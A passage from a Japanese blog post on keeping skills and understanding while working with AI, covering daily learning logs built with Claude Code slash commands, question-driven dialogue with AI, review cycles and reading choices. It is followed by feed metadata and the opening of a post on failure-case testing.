より深まると、パターンが見える。心の段階です。そして最後に、考えなくても手が動くようになる。摩擦が、学習を生んでいました。繰り返しが、成長を生んでいました。今は違います。AIに聞く。完璧なコードが返ってくる。動く。終わり。私は遊んでいません。型も知りません。観ることもありません。心を掴めません。当然、空には程遠い。結果は出ました。でも、自分の中に何も残っていません。成果だけが先に行き、自分は置き去りにされました。これがAI時代の問題の核心です。摩擦がないから、学べない。繰り返す機会がないから、成長しない。問題の核心は見えました。では、もう少し細かく見てみましょう。学習の5段階で、AIはどこを加速し、どこを壊しているのでしょうか。AIはどの段階を代替しやすいでしょうか。「型」です。正しい書き方、ベストプラクティス、パターンの適用。AIはこれらを高速に提供してくれます。初心者がいきなり熟練者と同じ「型」を使えるようになる。これ自体は悪くありません。では、AIが壊すのはどこでしょうか。「遊」と「観」です。特に「遊」のダメージは深刻です。「遊」が消えると何が起きるのでしょうか。遊びとは、目的なく触ること。壊してみること。限界を探ること。正解がすぐ手に入る環境では、不規則さ・寄り道・失敗が排除されます。効率を求めると、遊びは最初に切り捨てられます。しかし、遊びは単なる入口ではありません。型や観に進むためのエネルギー源でもあります。なぜでしょうか。「型」を学ぶのは退屈です。ドキュメント通りに書く。お手本を真似る。地味な作業です。この退屈に耐えられるのは、「遊」の段階で「面白い」という感覚を得ているからです。「この技術、面白い。だから、ちゃんと学びたい」。このモチベーションがなければ、「型」の段階で挫折します。「観」も同様です。「なぜこうするのか」と問うのは、好奇心がなければできません。好奇心は「遊」で育ちます。遊びがないと、「なぜ」を問う動機がない。「動くからいい」で終わります。遊びがないと、「面白いから学ぶ」がなくなります。「必要だから学ぶ」だけになる。必要性で駆動される学習は、必要がなくなった瞬間に止まります。遊びが失われると、学習への意欲そのものが枯れるのです。「観」も壊れやすい段階です。「なぜこうするのか」と問う前に、AIが答えを出してしまう。構造を自分で見出すプロセスがスキップされます。答えは知っている。でも、答えに至る道筋が見えない。観る力はどこで育つのでしょうか。自分で構造を発見する経験の中です。AIがその経験を奪います。型を飛ばすと、なぜ応用できないのでしょうか。型は「基盤となる最も基本的なもの」です。基盤がないと、その上に何も建てられません。AIが型を代替してくれると、基盤が自分の中にない。だから、少し変わった状況に対応できないのです。学習はなぜ循環構造なのでしょうか。「空」に達しても、また「遊」に戻ります。新しい領域を学ぶとき、再び遊びから始まる。この循環が止まらない限り、人は成長し続けます。AIが「遊」を奪うと、循環そのものが止まります。「心」と「空」は、そもそも到達しにくくなります。基盤となる「遊」と「観」が欠けているからです。本質を掴むには、周辺を十分に探索している必要があります。無意識に動けるようになるには、意識的に何度も繰り返した経験が必要です。AIは上層を加速しますが、基盤を掘り崩します。思い返せば、私が一番成長したのは「遊んでいた」時期でした。学生時代、深夜にLinuxをいじっていました。「このコマンドに変なオプションを渡したらどうなるんだろう」と試した。システムが壊れた。復旧に3時間かかった。でも、その3時間でファイルシステムの構造を理解しました。教科書を読むより、壊して直す方がずっと早く学べました。社会人になってからも、余裕があるときは遊んでいました。「この機能、公式ドキュメントにはこう書いてあるけど、本当にそうなのか」と検証した。ドキュメントが間違っていることもありました。公式が想定していないパターンを見つけることもありました。遊びは、ドキュメントの外側を教えてくれました。今はどうでしょうか。遊ぶ暇があったら、次のタスクをAIに投げています。効率的です。生産的です。でも、技術との「雑談」がなくなりました。目的のない探索がなくなりました。効率を追求した結果、学習の肥沃な土壌を捨てていたのです。遊びがないと、表面的な理解で終わります。ドキュメントに書いてあることは知っている。でも、書いていないことは知らない。想定外の状況に遭遇したとき、対処できません。遊んでいないから、技術の「手触り」がわからないのです。ここまで、学習の5段階と、AIがそれをどう壊すかを説明しました。問題は見えました。では、どうすればいいのでしょうか。答えは単純です。何がわかっていないのかを、見えるようにする。何が欠けているのか。どこで躓いているのか。それを捕まえる。見えれば、対策が打てます。学習の段階で言えば、自分が「遊」で止まっているのか、「型」が足りないのか、「観」ができていないのか。それを知る必要がある。しかし、AIと効率的に働いていると、自分がどこで止まっているかすら見えない。見えないものは改善できない。だから、見えるようにする仕組みが必要だ。そこで私は、先に触れた日報を本格的に活用することにしました。1週間続けて、衝撃を受けました。自分がこんなにも理解していなかったのか。金曜の夜、その週の日報を見返した。「わからない」と書いた項目を数えてみようと思った。月曜の分から順番に。1、2、3... 10を超えたあたりで、手が止まった。まだ火曜だった。水曜、木曜、金曜と続く。「なぜ」がわからないもの、「本質」が見えないもの。多すぎた。画面を見つめながら、胃のあたりがざわついた。正直、途中で数えるのをやめた。自分は理解の入口にすら立っていなかった。しばらく、椅子に座ったまま動けなかった。これが自分の実力なのか。毎日コードを書いて、PRをマージして、それなりにやっているつもりだった。でも、蓋を開けてみれば、理解の穴だらけだった。恥ずかしさ、情けなさ、少しの怒り。それらの混ざった感情が胸に込み上げてきた。でも、その夜、不思議と眠れた。これは希望でもあったからだ。自分の現状を捕まえさえすれば、次に進める。見えない敵は怖いが、見える敵は対策できる。何より、問題が見えた。見えないまま衰えていくより、ずっといい。だから、日報について詳しく説明したい。なぜ日報が効くのか。どう書けばいいのか。日報がなぜ「記録」以上の意味を持つのか。それを理解するには、日報が何を可視化しているかを知る必要がある。日報は単なるログではない。曖昧さを捕まえるためのセンサーだ。書くことは、なぜ理解を深めるのか。AIと働いていると、違和感は一瞬で消える。「なんかわからないな」と思った次の瞬間、AIに聞いている。違和感を感じている時間がない。日報に「なぜ:」と書こうとすると、その違和感を言語化しなければならない。「何がわからないのか」を言葉にする。この言語化のプロセスで、曖昧だった問題が明確になる。書くことは、理解を深める。なぜなら、書けないことは理解していないことだからだ。その場で書くことに意味はあるのか。ある。学習の起点は「わからなかった点」にある。しかし、「わからなかった」という感覚は、時間とともに薄れる。翌日には忘れている。1週間後には、何がわからなかったかすら思い出せない。日報は、躓きを時間差で消えない形に固定する。その場で書かないと、学習の種が消える。日報は何を可視化しているのか。自分が何をわかっていて、何をわかっていないか。どこで繰り返し躓いているか。どのパターンが苦手か。可視化されて初めて、対策が可能になる。見えないものは改善できない。日報は、見えないものを見えるようにする。なぜ「躓き」が重要なのか。躓きは、成長の種だ。スムーズにできたことからは、何も学べない。躓いたところに、学びがある。日報は、躓きを収集するシステムだ。躓きを記録し、パターンを見つけ、対策を打つ。このサイクルが学習を生む。日報がないと何が起きるのか。躓きが流れていく。同じところで何度も躓く。でも、躓いていることに気づかない。気づかないから、対策も打てない。日報がない状態は、センサーのない飛行だ。どこに向かっているかわからない。何が起きているかわからない。墜落してから、問題に気づく。では、日報には何を書けばいいのか。私がよく使うのは「なぜ:」と「試した:」だ。「なぜ:」——理由がわからなかったことを記録する。「なぜ: この実装パターンを選んだ理由」。表面的な理解で終わらせない。「試した:」——目的のない探索を記録する。「試した: このライブラリ、何ができるんだろう。ドキュメントを読まずに動かしてみた」。好奇心が動いた瞬間を残す。キーワードは自分で決めればいい。「写経:」「本質:」「ハマった:」など、必要に応じて増やせばいい。大事なのは、何がわからなかったかを捕まえること。記録することで、自分の躓きパターンが見えてくる。以前は、労働の中で自然と学んでいた。困難にぶつかり、格闘し、乗り越える。そのプロセスが、理解を深めてくれた。今は違う。AIが困難を消してくれるから、格闘する機会がない。だから、意識的に躓きを記録し、学習の種類を分類する必要がある。日報は、そのための道具だ。ここまでは日報の「考え方」を説明した。では、具体的にどう実装するのか。私はClaude Codeのカスタムslash commandsで日報システムを作った。詳しい実装は以前の記事に書いた。syu-m-5151.hatenablog.comClaude Codeには強力なカスタマイズ機能がある。CLAUDE.mdというMarkdownファイルをプロジェクトルートや~/.claude/に置くと、AIがそれを読み込んで動作を調整する。コーディング規約、プロジェクト固有のルール、よく使うパターンなどを書いておけば、AIがそれを参照しながら作業してくれる。また、~/.claude/commands/にMarkdownファイルを置くと、カスタムslash commandsとして使える。/nippo-addと打てば、日報追加用のプロンプトが実行される。AIを「自分専用の道具」に育てる仕組みだ。私の日報システムは3つのコマンドで構成される。/nippo-add - 作業中にその場で記録する。Issue番号や感情も一緒に書く。後から検索しやすくなる。/nippo-finalize - 1日の終わりに実行。散らばった記録をAIが整理して、読みやすい日報に仕上げる。/nippo-show - 日次・週次のサマリーを表示。繰り返し躓いているパターンを可視化する。コマンドファイルは ~/.claude/commands/ に置く。プロジェクトをまたいで使える。CLAUDE.mdにはプロジェクトの文脈を、commands/には繰り返し使う操作を。この2つで、AIは「汎用ツール」から「自分の相棒」に変わる。/nippo-add #456 JWTの検証ロジック実装開始/nippo-add #456 AIが書いたコード動いた。でもなぜRS256なのかわからない/nippo-add なぜ: RS256とHS256の違い/nippo-add 試した: JWTのペイロードに変なデータを入れたらどうなるかポイントは作業中に記録すること。1日の終わりにまとめて書こうとすると、何をやったか思い出せない。その場で書けば、摩擦がない。「なぜ:」「試した:」などのキーワードを入れておけば、後から抽出しやすい。自分がどこで躓いているか、一目でわかる。キーワードは何でもいい。「ハマった:」「理由:」でも、英語で「why:」でも構わない。大事なのは、自分が後から検索しやすく、学習のパターンを把握できること。正解はない。自分にしっくりくる言葉を見つければいい。日報を見返すと、同じ技術で同じ種類の躓きが繰り返されている。非同期処理では「なぜ」がわからない。エラーハンドリングでは「本質」が見えない。新しいライブラリでは「試した」が足りない。繰り返し出てくるということは、その部分で理解が止まっているということだ。弱点が見える。弱点が見えれば、対策が打てる。日報は、学習のガイドになった。日報のキーワードが学習のトリガーここまで、日報を使って躓きを「記録する」方法を説明した。しかし、記録しただけでは学習は起きない。記録は入口に過ぎない。日報に「なぜ:」「試した:」と書いたら、それは学習のトリガーだ。記録して終わりではない。そのまま次に進まない。徹底的にAIと対話する。なぜ「対話する」なのか。ここが重要だ。キーワードで記録した躓きは、「わかっていない」ということだ。わかっていないことを、わかるようにするには、どうすればいいか。自分で調べてもいい。でも、AIがいる。AIは、わからないことを説明してくれる。問題は、AIの説明を受動的に聞くか、能動的に引き出すか、だ。私のルールは単純だ。これらのキーワードを書いたら、その場で最低10分はAIと対話する。10分で理解できなければ、20分かける。理解できるまでやる。次のタスクには進まない。ただ、ここで重要な反論がある。「10分で理解できるわけがない」という反論だ。確かにそうだ。複雑な概念を10分で完全に理解するのは無理がある。でも、重要なのは「10分という制約を設けること」自体にある。制約があるから、「本当にわからないこと」だけに集中できる。制約がなければ、際限なく調べ続けて、結局何も身につかない。では、具体的にどう「徹底的に対話する」のか。ここが最も重要なところだ。「AIと対話する」と言っても、やり方次第で効果は天と地ほど違う。徹底的に対話する技術「AIと対話する」とは具体的にどういうことか。まず、よくある間違いから見てみよう。AIに「答えをもらう」ことと、AIと「徹底的に対話する」ことは、本質的に違う。答えは受動。対話は能動だ。答えをもらう：「このエラーを直して」→ 直るコードが返ってくる → 動く → 終わり。人間側の思考は、ほぼゼロだ。問題を投げて、解決策を受け取る。コピペする。動く。何も考えていない。徹底的に対話する：「このエラーの原因は何？」→「なぜそうなる？」→「他にも同じパターンはある？」→「どう防げる？」。人間側に思考が発生する。質問を組み立てる段階で、自分が何をわかっていないか考える。答えを聞いて、次の質問を考える。このサイクル全体で、脳が動いている。なぜ「教えて」では足りないのか。「教えて」は丸投げだ。AIは何かを返す。でも、それがあなたに必要な説明かどうかわからない。あなたが何を知っていて、何を知らないか、AIには見えない。だから、的外れな説明が返ってくることもある。説明を引き出す側に何が求められるか。自分の理解の輪郭を先に差し出すことだ。「私はここまでわかっている。でも、ここからがわからない」。この輪郭を示すことで、AIは適切な説明を返せる。そして、輪郭を示す行為自体が、すでに学習だ。自分が何をわかっていないか言語化する。これは思考を整理する作業だ。説明を引き出す行為は、どの段階で人間側の思考を必要とするか。最初から最後までだ。何を聞くか考える。聞いた答えを解釈する。次に何を聞くか決める。答えを自分の文脈に当てはめる。このすべてが、能動的な思考だ。答えをもらうだけなら、受動的でいい。説明を引き出すには、能動的でなければならない。なぜ「自分の言葉で書き直す」ことが理解の判定基準になるのか。AIの言葉をそのまま使えるなら、理解していなくてもコピペできる。自分の言葉に置き換えるには、一度、頭の中で「翻訳」する必要がある。翻訳には理解が必要だ。書き直せない説明は、理解ではない。説明できるとはどういう状態か。因果を辿れる状態だ。「なぜこうなるか」を自分の言葉で説明できる。別の人に質問されても、答えられる。説明できるようになって初めて、その知識は「使える」ようになる。この違いは学習速度にどう影響するか。答えをもらい続けると、学習速度はゼロに近づく。説明を引き出し続けると、学習速度は加速する。同じAIを使っても、使い方で学習効果は天と地ほど違う。最初は恥ずかしかった。「こんな基本的なことも知らないのか」と思われるのが怖かった。でも、AIは笑わない。何度聞いても呆れない。AIは、最高の学習パートナーだ。この発見が、学び方を変えた。ステップ1: 自分の理解を言語化するいきなり「教えて」と聞かない。まず自分が何をわかっていて、何がわからないかを言語化する。RS256とHS256について、私の現在の理解を確認させて。私の理解：- 両方ともJWTの署名アルゴリズム- HS256は「対称鍵」を使う（たぶん）- RS256は「非対称鍵」を使う（たぶん）わからないこと：- なぜRS256の方が「セキュア」と言われるのか- どういう場面でどちらを選ぶべきかこの理解は合ってる？こうすることで、AIは私の理解レベルに合わせた説明をしてくれる。輪郭を示す行為自体が、すでに学習だ。ステップ2: 「なぜ」を3回以上繰り返す表面的な理解で終わらせない。本質に到達するまで「なぜ」を繰り返す。なぜJWTの署名にRS256を使うの？→ 「秘密鍵と公開鍵を分離できるから」なぜ分離する必要があるの？→ 「検証側に秘密鍵を渡さなくて済むから」なぜ検証側に秘密鍵を渡すとまずいの？→ 「サービスが増えると秘密鍵を知る場所が増える。1箇所でも漏洩したら全体が危険になる」3回目の「なぜ」あたりから、本質的な理解が始まる。ここで「逆に、HS256を使うべきケースは？」「RS256のデメリットは？」と逆のケースも聞く。正解だけでなく不正解を知ることで、判断基準が明確になる。ステップ3: 自分の言葉で要約するここまで理解したら、AIの説明をコピペせず、自分の言葉で要約する。/nippo-add 振り返り: RS256 vs HS256 を理解した【本質】- HS256 = 共通鍵。署名も検証も同じ秘密を使う- RS256 = 公開鍵暗号。検証側に秘密を渡さなくて済む【使い分け】- モノリス → HS256で十分- マイクロサービス → RS256一択書き直せなかったら、まだ理解していない。もう一度ステップ1から繰り返す。復習のサイクルここまでで、2つのことを説明した。日報で躓きを記録すること。そして、その躓きについてAIと徹底的に対話すること。記録と対話。この2つで、学習は起きるはずだ。でも、実際にやってみると、これだけでは足りなかった。理解しても、忘れる。日報を書いた。AIと対話した。その場では理解した。「ああ、そういうことか」と納得した。でも1週間後、同じことでまた躓いている。「あれ、これ前にも調べなかったか？」。書いただけでは、脳に定着しない。同じ内容を間隔をあけて復習すると、記憶に残りやすい。だから復習のサイクルを作った。翌朝（5分）：前日の日報を見返す。見返すだけでいい。「ああ、これ昨日引っかかったやつだ」と思い出す。思い出す行為自体が、記憶を強化する。実際にやってみると、面白いことが起きた。朝、コーヒーを淹れながら昨日の日報を開く。「RS256とHS256の違い」という項目を見る。「えーと、RS256は公開鍵暗号で...」と頭の中で再生しようとする。すると、昨日は理解したはずなのに、もう曖昧になっている部分がある。忘れかけているタイミングで思い出すことが、記憶を強化する。これを毎朝やるだけで、定着率が全然違う。週末（30分）：その週の日報をまとめて確認。2回以上出てきた項目は、その場でAIと対話して理解を深める。理解できたらチェックを入れる。ある週末、日報を見返していて気づいた。「非同期処理」という項目が、月曜、水曜、金曜と3回出てきている。3回も「なぜ」がわからないと書いているのに、そのたびに次のタスクに進んでいた。繰り返し出てくるということは、その部分の理解が止まっているということだ。その週末、2時間かけてPromiseとasync/awaitを徹底的に理解した。翌週から、非同期処理で詰まることがなくなった。月末（1時間）：月間の傾向分析。3回以上出てきた項目は、根本的な知識の穴だ。書籍を買って体系的に学ぶ。月末の分析で、自分の弱点のパターンが見えてきた。私の場合、「認証・認可」「データベースの最適化」「インフラ周り」が繰り返し出てくる。これは断片的な理解では対応できない。体系的に学ぶ必要がある。だから、月末に1冊ずつ関連書籍を買うことにした。日報は、次に買うべき本を教えてくれる。学んだことは、忘れる。これは避けられない。忘却は敵ではない。思い出せないことが敵だ。日報は「思い出すためのフック」を作る作業だ。完璧に覚えようとしなくていい。戻れる仕組みを作ればいい。人間は意志を保てない。「毎日復習しよう」と決めても、忙しくなれば忘れる。だから仕組みを作る。日報システムは、学習の意志を外部化したものだ。意志に頼らず、習慣に組み込む。学習時間の設計ここまで、日報の書き方、AIとの対話の仕方、復習のサイクルを説明した。方法論は揃った。しかし、ここで当然の疑問が浮かぶ。「いつやるのか？」だ。日報を書く。復習する。わからないことはAIと対話する。週末にまとめて振り返る。どれも時間がかかる。全部やるのは大変そうだ。正直、私もそう思った。会社によっては、学習時間を労働時間としてカウントしてくれるところもある。成果を出すタイミングと学習するタイミングが違っても、それを認めてくれる環境もある。もしそういう会社にいるなら、堂々と労働時間内で学習すればいい。ただ、認めなければならない現実がある。成果を出す時間と、学習する時間は、同時には起きにくくなった。かつて労働は最高の学習だった。しかし今は違う。AIと協働する効率化されたプロセスの中では、学習に必要な「摩擦」が発生しない。タスクは完了する。成果物は出る。それでも、脳には何も残らない。効率の代償は、成長だった。これは構造的な問題だ。だから私は、一度分けることにした。成果を出す時間と学習する時間を、意識的に。成果を出す時間は、AIと一緒に効率よくタスクを消化する。学習する時間は、AIなしで、あるいはAIと徹底的に対話しながら、理解を深める。分けた上で、日報で再接続する。私の1週間はこうなっている。月曜 6:00-6:30：先週の日報を見返す。躓いている項目の中で、今週取り組むべきものを3つ選ぶ。カレンダーに学習時間をブロックする。「今週はこの3つを理解すれば、来週の開発が楽になるはず」。仮説を立て、検証し、修正する。学習も開発と同じだ。水曜 12:00-12:30：昼休みを使って、月曜に選んだ項目を深掘りする。わからないことをAIに問いかけ、徹底的に対話する時間だ。金曜 6:30-8:30：「素手の時間」。AIなしでコードを書く。「AIがあるのに使わないのは非効率だ」という反論があるだろう。確かに、短期的には非効率だ。でも、AIと働き続けていると、基礎力が衰える。使わない筋肉は、静かに萎える。基礎がわかっていれば、AIの出力を評価できる。基礎が怪しければ、動くまでガチャを回すだけになる。この時間にやることは3つある。日報で見つけた躓きをAIなしで調べる。小さなユーティリティ関数を手書きする。エラーメッセージを自力で読み解く。AIに聞けば5分で済むことを、30分かけてやる。この30分が、理解の深さを変える。最初の金曜日、2時間が永遠に感じた。簡単なはずの処理が書けない。「こんなことも自分でできないのか」と、情けなくなった。でも、2時間が終わったとき、達成感があった。自分の手で書いた。久しぶりの感覚だった。AIなしで書いてみると、「本当にわかっていること」と「AIに頼っていたこと」の境界が明確になる。自分の実力が、残酷なほど見える。見えるからこそ、対策が打てる。土曜 朝30分：週の振り返り。3つの項目は理解できたか。理解できなかったものは、来週に持ち越す。完璧を求めない。7割理解できれば、次に進む。最初は週3時間も取れないと思った。でも、試してみると、この3時間で週の残り37時間の労働効率が上がった。学習は消費ではない。複利で回収できる投資だ。理解が深まると、AIへの指示が的確になる。学習への投資は、労働の効率で回収できる。私の場合、成果を出すことと学ぶことが自然には重ならなくなった。だから意識的に交差点を作っている。日報が教えてくれる「次に学ぶべきこと」ここまで、学習の「方法」を説明した。日報で記録する。わからないことはAIと対話して理解を深める。復習する。学習時間を確保する。これで「どう学ぶか」は揃った。しかし、「何を学ぶか」は、まだ説明していない。時間は限られている。何を優先すべきか。闇雲に学んでも、効率が悪い。答えは、日報の中にある。日報を続けていると、躓きのパターンが見えてくる。同じ項目が繰り返し出てくる。認証。非同期処理。データベース。繰り返し出てくるということは、断片的な理解では足りないということだ。そこで、日報をインプットのガイドにする。月末に日報を見返して、3回以上出てきた項目を特定する。それに関連する学習リソースを選ぶ。日報は「次に何を学ぶべきか」を教えてくれる。私の場合、月に技術書を10冊、非技術書を10冊、合わせて20冊前後読んでいる。しかし、これは極端な例だ。最初は月1冊でも十分効果がある。大事なのは冊数ではなく、日報で見つけた躓きに関連する本を選ぶことだ。書籍の良いところは、最低限のクオリティが担保されていることだ。最高のブログは刺さる。でも、最低のブログを引くこともある。書籍は編集者の目を通っている。時間は有限だから、ハズレを引きたくない。日報で繰り返し出てくる躓きを見て、関連する技術書を選ぶ。書籍だけではない。公式ドキュメントやRFC、OSSのソースコードも読む。二次情報で満足せず、一次情報に戻る習慣。これが理解の深さを決める。使っているライブラリの実装を見ると、設計判断の理由がわかる。上級者向けだが、他社の障害報告書も参考になる。ポッドキャストも意外と効く。特にリモートワーカーにおすすめしたい。ちゃんと聞かなくていい。BGMのように流しておくだけでいい。リモートワークを続けていると、雑談が絶望的に下手になる。下手になると、雑談をしたくなくなる。したくなくなると、技術的なことを気軽に話す機会が減る。機会が減ると、間違った理解を指摘してもらえなくなる。悪循環だ。技術系ポッドキャストを聞いていると、エンジニア同士の会話のリズムが耳に残る。話題の引き出しも増える。Xで信用できるアカウントをフォローしておくのもいい。タイムラインを眺めているだけで、今何が話題になっているかがわかる。しかし、Xは使い方が難しい。今やアテンション・エコノミーのど真ん中で、みんなが揉めている。情報収集のつもりが、気づいたら論争を眺めて時間を溶かしていることがある。意識的に距離を取る必要がある。AIに聞けば答えは返ってくる。でも、体系的な理解は書籍や公式ドキュメントでないと得られない。AIは「この問題の解決策」を教えてくれる。書籍は「なぜその解決策が正しいか」を教えてくれる。AIとの協働で生まれた躓きを、AIの外で埋める。あなたの現在地を見つけるためにここまで、私がやってきたことを説明した。日報で躓きを記録する。AIと徹底的に対話する。復習のサイクルを回す。学習時間を確保する。日報から次に学ぶべきことを見つける。インプットを選ぶ。たくさんあるように見えるかもしれない。全部やる必要はない。でも、何かを始める必要はある。ここまで読んでくれたあなたに、問いかけたい。この1週間を振り返ってみてほしい。AIに聞いて解決したけど、なぜその解決策が正しいのか説明できない問題はなかっただろうか。同じ種類の問題に、何度も遭遇していないだろうか。コードは動いた。でも「なぜ動くのか」を同僚に説明できるだろうか。もし1つでも「怪しい」と感じるものがあれば、それがあなたの躓きだ。今日から日報に書き始めてほしい。日報を1週間続けたら、見返してみてほしい。何が繰り返し出てくるか。認証なのか、非同期処理なのか、データベースなのか。繰り返し出てくるものが、次に学ぶべきことだ。そのとき、インプットを意識的に選んでほしい。体系的に理解したいなら書籍。正確な仕様や実装の判断基準を知りたいなら公式ドキュメントやOSSのソースコード。リモートワーカーならポッドキャストもいい。Xで信用できるアカウントをフォローしておくのも悪くない。日報が「次に何を学ぶべきか」を教えてくれる。インプットは、日報を見て選ぶ。AIに聞けば答えは返ってくる。でも、「なぜその答えが正しいか」を理解するのは、AIの外でやる仕事だ。日報は、その仕事を始める場所を教えてくれる。おわりにここまで、私がやってきたことをすべて説明した。日報、AIとの対話の技術、復習のサイクル、学習時間の設計、インプットの選び方。これらは、私がAI時代に「学ぶ」ために見つけた方法だ。最後に、1つだけ伝えたいことがある。この記事で一番大事なことだ。ここまで読んで、気づいた人もいるだろう。私はCLAUDE.mdに学びを書き込んでいる。プロジェクトの文脈、コーディング規約、過去に得た知見。では、AIは賢くなっているのか。答えはNoだ。AIは何も学んでいない。CLAUDE.mdに書かれた内容は、セッションの最初に読み込まれる。でも、それは「学習」ではない。ただの「入力」だ。AIは前回の会話を覚えていない。経験を蓄積しない。「わからない」を経験しない。AIは、このブログが警告している「学ばない労働者」そのものだ。CLAUDE.mdを充実させれば、AIの出力は変わる。使い込むほど手に馴染む道具にはなる。でも、設定を書いたのは誰か。あなただ。試行錯誤したのは誰か。あなただ。AIが賢くなったように見えるのは、あなたが賢くなったからだ。学習とは、経験を意味に変換する行為だ。これが、この記事を通じて私がたどり着いた核心だ。AIは情報を処理できる。でも、AIにとってそれは「意味」を持たない。人間は違う。経験が意味になる。「あのバグを直した」という経験が、「自分はできる」という自信になる。経験を意味に変換できるのは、人間だけだ。AIと協働しながらも、熟達する主体であり続けるために必要な設計がある。遊びの時間を確保すること。目的のない探索がないと、好奇心が死ぬ。「わからない」状態を意図的に作ること。AIに聞けばすぐわかる。でも、あえて聞かない時間が思考力を維持する。記録を習慣にすること。書かないと忘れる。説明を練習すること。説明できなければ、理解していない。「素手」で戦う時間を持つこと。AIなしでコードを書く時間が、基礎力を維持する。これらに共通するのは、摩擦・記録・言語化だ。摩擦が経験を生む。記録が経験を残す。言語化が経験を意味に変える。AIはこの3つを肩代わりしてくれる。だから楽になる。でも、肩代わりさせると、人間は主体でなくなる。最後に、もう一度聞かせてほしい。あなたは最近、「成長している」と感じているだろうか。もし少しでも不安があるなら、今日から日報を開いてみてほしい。「なぜ:」「試した:」と書いてみてほしい。たった1行、それだけでいい。完璧な日報を書く必要はない。その不完全な1行が、次の1行を呼ぶ。そして、その積み重ねがあなたの脳を取り戻す。3日で挫折するだろう。私自身、何度も挫折した。でも、4日目にまた始めればいい。何度でもやり直せる。完璧に続けることより、何度でも再開できることの方が大事だ。1ヶ月後、あなたは変わっている。同僚に「この実装、どうしてこうしたの？」と聞かれたとき、淀みなく答えられる自分がいる。障害が起きたとき、自分のコードを頭の中でトレースできる自分がいる。日報を見返すと、「なぜ:」で埋まっていた項目が、少しずつ減っている。それが、成長の証だ。あなたの脳は、取り戻せる。このブログが良ければ読者になったり、nwiizoのXやGithubをフォローしてくれると嬉しいです。参考書籍知性の未来―脳はいかに進化し、AIは何を変えるのか―作者:マックス・ベネット新潮社AmazonPLURALITY　対立を創造に変える、協働テクノロジーと民主主義の未来（サイボウズ式ブックス）作者:オードリー・タン,E・グレン・ワイルライツ社Amazon奪われた集中力: もう一度〝じっくり〟考えるための方法作者:ヨハン・ハリ作品社Amazon熟達論―人はいつまでも学び、成長できる―作者:為末大新潮社Amazon学びとは何か－〈探究人〉になるために (岩波新書)作者:今井 むつみ岩波書店Amazon学びをやめない生き方入門作者:中原淳,パーソル総合研究所,ベネッセ教育総合研究所テオリアAmazon私たちはどう学んでいるのか: 創発から見る認知の変化 (ちくまプリマー新書 403)作者:鈴木 宏昭筑摩書房Amazonシン読解力―学力と人生を決めるもうひとつの読み方作者:新井 紀子東洋経済新報社Amazon夏蜜柑とソクラテス作者:新井 紀子草思社Amazon","isoDate":"2025-12-17T03:17:05.000Z","dateMiliSeconds":1765941425000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"最近読んでいて興味深かった記事紹介 Vol.4","link":"https://zenn.dev/akasan/articles/interesting_tech_blog_4","contentSnippet":"今回で4回目の、最近読んで気になっている記事紹介になります！年末に向けて色々読んでいきたいので、最近見たものを紹介できればと思います！過去の記事は以下に載っていますので、ご興味ある方は是非ご覧ください。https://zenn.dev/akasan/scraps/97b063540d2372 Docker MCP Gateway:エージェントAIのためのオープンソースの安全なインフラストラクチャ私自身あまりMCPを利用できていないのが現状なのですが、dockerを利用してMCPをうまく運用するための方法をキャッチアップするために見ています！https://www.docker...","isoDate":"2025-12-16T13:14:53.000Z","dateMiliSeconds":1765890893000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"地球規模の「時間のずれ」を Cloud Spanner はどう解決したか","link":"https://sreake.com/blog/how-cloud-spanner-deal-with-large-scale-time-diff/","contentSnippet":"はじめに Sreake 事業部の芳賀雅樹 (@silasolla) です．普段はアプリケーションの開発支援を担当していますが，今回はその基盤となるデータベースの裏側の仕組みが気になり，深掘りしてみました． 早速ですが，G […]The post 地球規模の「時間のずれ」を Cloud Spanner はどう解決したか first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-12-16T01:39:59.000Z","dateMiliSeconds":1765849199000,"authorName":"Sreake","authorId":"Sreake"},{"title":"AI時代の異常系テストについて考える","link":"https://syu-m-5151.hatenablog.com/entry/2025/12/16/102227","contentSnippet":"はじめに深夜2時、本番環境のアラートが鳴り響きます。外部APIがタイムアウトを返し始め、リトライが暴発し、システム全体が連鎖的に停止しました。原因を調べると、外部サービスの一時的な遅延でした。たった数秒の遅延が、なぜシステム全体を止めたのか。答えは単純です。「外部APIが遅延したらどうなるか」を、誰もテストしていなかったからです。私自身、このような障害を何度か経験してきました。コードをマージした翌朝にSlackが炎上していたこともあります。「なぜこのケースを考えなかったのか」と自分を責めながら、ホットフィックスを書いた夜もあります。そのたびに思います。あのとき、たった1つのテストを書いていれば。これは「異常系テスト」の不足が引き起こした障害です。正常系のテストは比較的書きやすいです。入力があり、期待する出力があり、それを検証します。しかし、プロダクション環境で本当に問題になるのは異常系です。ネットワークが切断されたとき、システムはどう振る舞うべきか。データベースがタイムアウトしたとき、ユーザーには何を伝えるべきか。想定外の入力が来たとき、エラーメッセージは適切か。こうした問いに答えるのが、異常系テストです。そして今、この異常系テストの世界が大きく変わりつつあります。2024年、AIがOpenSSLに20年間潜伏していた脆弱性を発見しました。人間が書いたファジング（ランダムなデータを入力してバグを探す手法）では見つけられなかった欠陥です。Google OSS-FuzzはAIによるファズターゲット生成で26件の脆弱性を発見し、既存の人間作成ターゲットから最大29%のカバレッジ向上を実現しました。人間だけでは見つけられなかった異常を、AIが発見する時代になりました。本記事では、この変化を踏まえて異常系テストの考え方をまとめました。まず基本的な技法を押さえ、その上でAIやカオスエンジニアリングといったものを紹介します。あの深夜のアラートを、未来の自分や読者が経験しなくて済むように。本題に入る前に本記事を読む前に、いくつか断っておきたいことがあります。私はテストの専門家ではありません。日々コードを書きながら、「この処理が失敗したらどうなるだろう」と考える、一人のエンジニアです。ここに書いてあることは、思いついたものをまとめただけなので不足もあるでしょう。実装しながら単体テストやエラーハンドリングを考える際のヒントとして使ってもらえればと思います。もう一つ、大事なことがあります。すべてのパターンをテストする必要はありません。過度なテストパターンは無駄な工数を生むだけではありません。テストが増えれば増えるほどCIの実行時間は長くなり、開発サイクルは遅くなります。テストコードを読んで理解するにも認知コストがかかります。テストが多すぎると、「このテストは何を確認しているのか」を把握するだけで疲弊してしまいます。テストのROI（投資対効果）を意識し、リスクの高い箇所に集中することが重要です。とはいえ、最近は生成AIのモデル精度が上がったおかげで、文脈を読み取ってテストコードを生成してくれるようになりました。「何をテストすべきか」を判断し、AIに生成を任せる。その使い分けが、今のエンジニアに求められています。そして、ここが難しいところなのですが、異常系テストがどれくらい必要かは、その人の経験に大きく依存します。本番障害で痛い目を見た人は「ここまでテストすべきだ」と感じます。幸